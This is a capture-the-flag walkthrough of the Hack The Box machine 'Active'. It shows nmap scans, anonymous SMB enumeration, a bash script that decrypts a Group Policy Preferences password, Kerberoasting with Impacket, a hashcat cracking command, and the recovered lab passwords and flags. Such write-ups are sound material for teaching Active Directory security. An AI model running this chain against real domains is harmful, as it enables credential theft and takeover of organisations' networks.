148 - Active
============

Mandatory nmap scan:
```bash
❯❯❯ sudo nmap -sS --top-ports 200 10.10.10.100
Starting Nmap 7.70 ( https://nmap.org ) at 2018-08-10 16:39 CEST
Nmap scan report for 10.10.10.100
Host is up (0.062s latency).
Not shown: 185 closed ports
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49157/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 0.60 seconds
```

More nmap:
```bash
❯❯❯ sudo nmap -sS -sV -sC -O --top-ports 200 10.10.10.100
Starting Nmap 7.70 ( https://nmap.org ) at 2018-08-10 16:41 CEST
Stats: 0:02:06 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.95% done; ETC: 16:43 (0:00:00 remaining)
Nmap scan report for 10.10.10.100
Host is up (0.048s latency).
Not shown: 185 closed ports
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2018-08-10 14:41:44Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.70%E=4%D=8/10%OT=53%CT=1%CU=34782%PV=Y%DS=2%DC=I%G=Y%TM=5B6DA4A
OS:5%P=x86_64-pc-linux-gnu)SEQ(SP=FC%GCD=1%ISR=104%TI=I%CI=I%II=I%SS=S%TS=7
OS:)SEQ(SP=FC%GCD=1%ISR=104%TI=I%CI=RD%II=I%TS=7)OPS(O1=M54DNW8ST11%O2=M54D
OS:NW8ST11%O3=M54DNW8NNT11%O4=M54DNW8ST11%O5=M54DNW8ST11%O6=M54DST11)WIN(W1
OS:=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000)ECN(R=Y%DF=Y%T=80%W=2000%O
OS:=M54DNW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T
OS:=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=
OS:0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=
OS:Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=
OS:Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%R
OS:IPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 2 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2018-08-10 16:42:54
|_  start_date: 2018-08-10 15:47:29

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 135.59 seconds
```

Enumerating SMB using nullinux.py:
```bash
❯❯❯ ./nullinux.py -all 10.10.10.100                                           ⏎

    Starting nullinux v5.3.1 | 08-10-2018 17:01



[*] Enumerating Shares for: 10.10.10.100
        Shares                     Comments
   -------------------------------------------
    \\10.10.10.100\ADMIN$          Remote Admin
    \\10.10.10.100\C$              Default share
    \\10.10.10.100\IPC$
    \\10.10.10.100\NETLOGON        Logon server share
    \\10.10.10.100\Replication     
    \\10.10.10.100\SYSVOL          Logon server share
    \\10.10.10.100\Users           

   [*] Enumerating: \\10.10.10.100\Replication
       .                                   D        0  Sat Jul 21 12:37:44 2018
       ..                                  D        0  Sat Jul 21 12:37:44 2018
       active.htb                          D        0  Sat Jul 21 12:37:44 2018

[*] Enumerating Domain Information for: 10.10.10.100
[-] Could not attain Domain SID

[*] Enumerating querydispinfo for: 10.10.10.100

[*] Enumerating enumdomusers for: 10.10.10.100

[*] Enumerating LSA for: 10.10.10.100

[*] Performing RID Cycling for: 10.10.10.100
[-] RID Failed: Could not attain Domain SID

[*] Testing 10.10.10.100 for Known Users

[*] Enumerating Group Memberships for: 10.10.10.100

[-] No valid users or groups detected
```

One can connect to the `Replication` share with:
```bash
$ smbclient //10.10.10.100/Replication -I 10.10.10.100 -N
```

Then it is possible to copy the content and we find the interesting things in `active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml`:
```xml
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```

The password here can be decrypted because it uses a fixed key published by Microsoft. One can use this bash script:
```
#!/usr/bin/env bash
#
# Decrypt credentials stored in Windows Group Policy Preferences
#
# See Blog for more information:
# https://blog.compass-security.com/2012/04/exploit-credentials-stored-in-windows-group-policy-preferences/
#

# Microsoft released AES key:
# https://msdn.microsoft.com/en-us/library/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be.aspx
KEY="4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b"

PASSWORD="$1"
#PASSWORD="9QHhFTUdm6rDgu30J7ShZfqt07T6vOUGkyAFG3G7M+5AotJjkOva7E9KSAcamdrruTgly0O/uVTB/UUdLNU4775b5381hyuUzkd4lJW+llcNNNrQlYu7zqH3/i+8jfjhUq9lqPn8VjCtb9iaEqWbKQ"

add_padding(){
  PADDINGLEHGTH="$((4 - $(echo "$1" | wc -L) % 4))"
  for i in $(seq "$PADDINGLEHGTH")
  do
    PADDING="${PADDING}$(echo -n =)"
  done
  echo "${1}${PADDING}"
}

decrypt_password(){
  echo "$1" \
    | openssl enc \
      -a \
      -d \
      -aes-256-cbc  \
      -K "$KEY" \
      -iv 00000000000000000000000000
  echo
}

main(){
  decrypt_password "$(add_padding "$PASSWORD")"
}

main "$@"
```

And we get the password for the user `active.htb\SVC_TGS`:
```bash
❯❯❯ ./gpo.sh edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
GPPstillStandingStrong2k18
```

Using these credentials we can mount the `Users` share and get the user flag in `SVC_TGS/Desktop/user.txt`:
```
86d67d8ba232bb6a254aa4d10159e983
```

## Privilege escalation

Given the name of our user SVC_TGS, this hints to kerberos (TGS == Ticket Granting Service). We can try to see if any account would be available for Kerberoasting. Let's get the SPNs from the domain using Impacket:
```
❯❯❯ ./GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/SVC_TGS
Impacket v0.9.18-dev - Copyright 2002-2018 Core Security Technologies

Password:
ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet      LastLogon           
--------------------  -------------  --------------------------------------------------------  -------------------  -------------------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 21:06:40  2018-08-13 17:08:44 



$krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~445*$99f50f3eb6f514a6ce1c0c907e381997$bdd1bd4852a441006fea314b5cf61aa618edd35412a7973aa568a2fcb05bc665702ca0d67f0100f07472f33a6ef6bb47f85cd9cfe52da7448960bc7bcf41e3dbdcafba0e2e4d0de0aea1f29010cf4085f02b702f822736d3ef61962204f08010202743ae220371908520449b16c0f3626a1c66b7d459924ab13b635483433acd999fc18252fae1c372a35a2676e79fb33ebadd2856cbe954f3156a31ba5d78d07800881d6ef3042cd1ed2827076050965d8c52d947973089e6bc57e4ac6e413de86f8630d89f6205faa12368f5778b3b146753bbc6a532ae85becaa631f9dd91e80f3f2dc5c4ff5fd57015998355eaf646afd2d5b01cddde73bf9722686fcd2433fee265be9a21245d1713a0fe1119640299143dfccb014a10fd1ee40079885b35c11baae219348a7fa14f3aea2e8de303c7c6c5a28e0118087637a4b9ee889ecc52423ecc5793420c569f1461dd6831aca5e7cf89a55d9e91e98ef8a903a3ba61f614116e28d954911911b9f39b54bf1a345649c202f9dad8f006a6dbfb141eefb4a5dddfb3206f6086c57a2d9c29b690cea546c78eaf79c9ecfa113a74e60e580aa7f2d07f1f8889731899373d5cf64f96839f7abe8de362ac636e0b90cf79e758cc76f3830ec9797a77ba8188b32d7551dce61d117940503fd81f2846adfc358618d08b9cd16194ea7cf3c9120c08ace60da92acc7de770d71a570f073880b1ed45d9be7d13dbd228b2bde04c94ad420e2faeca014dd5789f34f896f0d73792b4684c88b1f5f0e61d16be7987e78117e72eb8601022376683f30b118c3b081b691ac4b9f8bc0b621b6f38566be4f452fff7d0f1c8b71840de16dac7a2e1329cd2a1f96727ea7026780767c7ca48bbad405b383b0ef63676c5f49b05594e8e144d0afd82ddb86bcaab7ab3482e3499786b6b3f46322737277b54a4e4478ec4ab92de297e9c07e617dcd692686cf2d8179b53658575caf88972ddc584f532e010b1622f0cf3e642215a706d0e20bfef3350af0a4656a23f1991cfb14923b8f5290f458cf0f1b6e7f00ad570c030a69d27a62216593f6a568d74279a12a08e3dc1096e1cc97f7bf8e29603f94f4aedf84a390d182a89f5b299decf6611983055a4fb1d2cef34e8ed95e2c862e270b5af0a278fa666b1cebe532518fd87200e8463af0e8b3d10acf381457f39bfaaa4b88937311cfba3b5416fe9fbc58fc37555298fbb6b0f862897e30db7943e939e265262f7d1dd0d80c1dfa2
```

Nice, a hash for the administrator. Put it in txt file and crack using hashcat and the crackstation wordlist:
```
$ hashcat -m 13100 -a 0 -r ../nsa_500.txt kerberos-hash.txt ../crackstation-human-only.txt -O
```

After some time, hashcat gives the password, the password for the Administraotr account is:
```
Ticketmaster1968
```

From here, we can again connect to the User share, this time with the Administrator credentials to get the root flag in `/Users/Administrator/Desktop/root.txt`:
```
b5fc76d1d6b91d77b2fbf2d54d0f708b
```
